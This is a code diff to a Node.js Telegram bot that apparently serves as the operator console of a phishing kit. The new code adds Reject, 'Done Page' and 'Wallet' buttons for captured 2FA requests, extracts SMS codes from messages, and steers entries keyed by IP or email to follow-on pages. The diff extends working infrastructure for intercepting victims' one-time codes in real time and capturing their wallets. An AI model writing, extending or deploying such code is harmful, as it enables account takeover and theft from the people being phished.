@@ -163,6 +163,24 @@ async function sendVerifyTelegram(ip, message) {
 }
 
 // -----------------
+// ✅ NEW: 2FA page with 3 buttons (Reject / Done / Wallet)
+// Used by /api/submit-2fa-new only
+// -----------------
+async function send2FATelegram(message, requestId) {
+  const options = {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "❌ Reject", callback_data: `2fa_reject_new|${requestId}` }],
+        [{ text: "🏁 Done Page", callback_data: `2fa_done|${requestId}` }],
+        [{ text: "👛 Wallet", callback_data: `2fa_wallet|${requestId}` }]
+      ]
+    }
+  };
+  await bot.sendMessage(ADMIN_CHAT_ID, message, options);
+}
+
+// -----------------
 // 2FA Code sender (keyboard-based Accept/Reject)
 // -----------------
 function send2FACode(code, chatId) {
@@ -205,7 +223,7 @@ bot.on("callback_query", async (query) => {
     const [action, identifier] = query.data.split("|");
     let status;
 
-    // --- Handle 2FA approve/reject ---
+    // --- Handle old-style 2FA approve/reject (unchanged) ---
     if (action === "2fa_approve" || action === "2fa_reject") {
       const twoFaStatus = action === "2fa_approve" ? "approved" : "rejected";
       const twoFaEmoji = twoFaStatus === "approved" ? "✅" : "❌";
@@ -216,7 +234,6 @@ bot.on("callback_query", async (query) => {
         body: JSON.stringify({ requestId: identifier, status: twoFaStatus })
       });
 
-      // Step 1: Remove buttons, keep info message visible
       try {
         await bot.editMessageReplyMarkup(
           { inline_keyboard: [] },
@@ -227,7 +244,6 @@ bot.on("callback_query", async (query) => {
         );
       } catch (_) {}
 
-      // Step 2: Send status below
       const msgText = query.message.text || "";
       const smsMatch = msgText.match(/SMS[:\s]+([\d\s\-]+)/i);
       const displayCode = smsMatch ? smsMatch[1].trim() : null;
@@ -246,7 +262,43 @@ bot.on("callback_query", async (query) => {
       return;
     }
 
-    // --- Handle all other approvals ---
+    // --- ✅ NEW: Handle 2FA-new page 3-button actions ---
+    if (action === "2fa_reject_new" || action === "2fa_done" || action === "2fa_wallet") {
+      let newStatus, replyText;
+
+      if (action === "2fa_reject_new") {
+        newStatus = "rejected";
+        replyText = `❌ <code>${identifier}</code> has been <b>REJECTED</b>`;
+      } else if (action === "2fa_done") {
+        newStatus = "approved1";
+        replyText = `🏁 <code>${identifier}</code> has been directed to <b>Done Page</b>`;
+      } else if (action === "2fa_wallet") {
+        newStatus = "approved2";
+        replyText = `👛 <code>${identifier}</code> has been directed to <b>Wallet</b>`;
+      }
+
+      await fetch(`${APP_URL}/api/update-2fa-status`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ requestId: identifier, status: newStatus })
+      });
+
+      try {
+        await bot.editMessageReplyMarkup(
+          { inline_keyboard: [] },
+          {
+            chat_id: query.message.chat.id,
+            message_id: query.message.message_id
+          }
+        );
+      } catch (_) {}
+
+      await bot.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
+      await bot.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
+      return;
+    }
+
+    // --- Handle all other approvals (unchanged) ---
     if (action === "accept") status = "accepted";
     else if (action === "page1") status = "accepted1";
     else if (action === "page2") status = "accepted2";
@@ -263,7 +315,6 @@ bot.on("callback_query", async (query) => {
       body: JSON.stringify({ email: identifier, identifier, status })
     });
 
-    // Step 1: Remove buttons but KEEP the original info message visible
     try {
       await bot.editMessageReplyMarkup(
         { inline_keyboard: [] },
@@ -274,7 +325,6 @@ bot.on("callback_query", async (query) => {
       );
     } catch (_) {}
 
-    // Step 2: Send status below the original message
     let replyText;
     if (status === "accepted1" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
       replyText = `📍 <code>${identifier}</code> has been directed to <b>🏁 Done Page 🏁</b>`;
@@ -322,5 +372,6 @@ module.exports = {
   sendApprovalRequestPage,
   sendLoginTelegram,
   sendVerifyTelegram,
+  send2FATelegram,
   send2FACode
 };
